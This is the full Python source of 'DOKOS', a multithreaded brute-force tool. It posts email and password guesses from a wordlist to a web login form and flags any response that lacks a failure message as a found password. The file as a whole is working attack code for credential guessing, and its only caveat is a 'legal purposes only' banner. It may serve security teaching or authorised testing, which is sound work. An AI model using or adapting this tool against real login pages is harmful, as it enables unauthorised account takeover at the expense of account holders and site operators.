#!/usr/bin/python3

import argparse
from datetime import datetime
import sys
import urllib.parse
import urllib.request
import concurrent.futures
from threading import Lock
import os
import math
import validators


# print lock
# https://superfastpython.com/thread-safe-print-in-python/
LOCK = Lock()

RUN = True
ARGS = None
FOUND = []

def print_safe(string) :
    with LOCK:
	    print(string)

def show_version() : 
    # where is this file located
    dirname = os.path.dirname(__file__)
    with open(os.path.join(dirname, './VERSION')) as version_file:
        version = version_file.read().strip()
        print("v" + version)

def show_header() :
    print("""
██████╗  ██████╗ ██╗  ██╗ ██████╗ ███████╗
██╔══██╗██╔═══██╗██║ ██╔╝██╔═══██╗██╔════╝
██║  ██║██║   ██║█████╔╝ ██║   ██║███████╗
██║  ██║██║   ██║██╔═██╗ ██║   ██║╚════██║
██████╔╝╚██████╔╝██║  ██╗╚██████╔╝███████║
╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
""")
    show_version()

    print('https://gitlab.cylab.be/cylab/dokos')
    print('Use for legal purposes only!')
    print('')


def try_password(password) :
    '''
    Try a single password (post and check response page)
    '''

    # https://docs.python.org/3/howto/urllib2.html
    data = {
            "email" : ARGS.login,
            "password" : password
        }

    encoded_data = urllib.parse.urlencode(data).encode('ascii')

    request = urllib.request.Request(ARGS.url, encoded_data)
    try:
        
        response = urllib.request.urlopen(request)
        page = response.read().decode()

        if not ARGS.failed in page :
            FOUND.append(password)

    except urllib.error.HTTPError as e:
        print_safe("Error: " + repr(e))

    except urllib.error.URLError as e:
        print_safe("Error: " + repr(e))   

def try_passwords(passwords):
    '''
    Try a list of passwords
    '''

    for password in passwords :
        # we were interrupted by user
        if not RUN :
            break
        password = password.strip()
        print_safe("login: " + ARGS.login + " password: " + password)
        try_password(password)

def islice(iterable, *args):
    '''
    https://docs.python.org/3/library/itertools.html#recipes
    # islice('ABCDEFG', 2) --> A B
    # islice('ABCDEFG', 2, 4) --> C D
    # islice('ABCDEFG', 2, None) --> C D E F G
    # islice('ABCDEFG', 0, None, 2) --> A C E G
    '''
    slices = slice(*args)
    start, stop, step = slices.start or 0, slices.stop or sys.maxsize, slices.step or 1
    iterations = iter(range(start, stop, step))
    try:
        nexti = next(iterations)
    except StopIteration:
        # Consume *iterable* up to the *start* position.
        for i, element in zip(range(start), iterable):
            pass
        return
    try:
        for i, element in enumerate(iterable):
            if i == nexti:
                yield element
                nexti = next(iterations)
    except StopIteration:
        # Consume to *stop*.
        for i, element in zip(range(i + 1, stop), iterable):
            pass

def batched(iterable, count):
    '''
    Batch data into tuples of length count. The last batch may be shorter.
    https://docs.python.org/3/library/itertools.html#recipes

    >>> list(batched('ABCDEFG', 3))
    [('A', 'B', 'C'), ('D', 'E', 'F'), ('G',)]
    '''
    if count < 1:
        raise ValueError('n must be at least one')
    iterable = iter(iterable)
    while (batch := tuple(islice(iterable, count))):
        yield batch


def parse_arguments():
    '''
    Parse command line arguments
    '''
    global ARGS

    # https://docs.python.org/3/library/argparse.html
    parser = argparse.ArgumentParser()
    parser.add_argument('-l', '--login', required=True, help='Login to use')
    parser.add_argument('-P', '--passwords', required=True, help='File containing passwords')
    parser.add_argument('-t', '--threads', type=int, default=10,
    help='Number of threads (default: 10)')
    parser.add_argument('-f', '--failed', default="Bad combination of e-mail and password",
    help='Message indicating a failed attempt (default: "Bad combination of e-mail and password")')
    parser.add_argument('url')

    ARGS = parser.parse_args()

def main():
    '''
    Main DOKOS method
    '''

    start = datetime.now()

    show_header()
    parse_arguments()

    if not validators.url(ARGS.url) :
        print("URL " + ARGS.url + " is not valid!")
        sys.exit()

    if not os.path.isfile(ARGS.passwords) :
        print("Passwords file " + ARGS.passwords + " does not exist!")
        sys.exit()

    with open(ARGS.passwords, "r") as passwords_file:

        passwords = passwords_file.readlines()

        # passwords-per-thread
        ppt = math.ceil(float(len(passwords)) / ARGS.threads)

        print('URL: ' + ARGS.url)
        print('Login: ' + ARGS.login)
        print('Trying: ' + str(len(passwords)) + ' passwords with ' + str(ARGS.threads) + ' threads'
            + ' [' + str(ppt) + ' passwords per thread]')
        print('')

        # https://stackoverflow.com/a/15143994
        executor = concurrent.futures.ThreadPoolExecutor(ARGS.threads)
        futures = [executor.submit(try_passwords, group)
           for group in batched(passwords, ppt)]

        # https://stackoverflow.com/a/65207578
        try:
            concurrent.futures.wait(futures)
        except KeyboardInterrupt:
            # User interrupt the program with ctrl+c
            print_safe("Stopping threads...")
            global RUN
            RUN = False
            executor.shutdown(wait=True, cancel_futures=True)
            sys.exit()


        print("Done!")
        end = datetime.now()
        delta_t = (end - start).total_seconds()
        rate = len(passwords) / delta_t
        print("Time: " + str(delta_t) + " seconds [" + str(round(rate, 2)) + " passwords/sec]")
        print("Found " + str(len(FOUND)) + " password(s): " + str(FOUND))

if __name__ == "__main__":
    main()
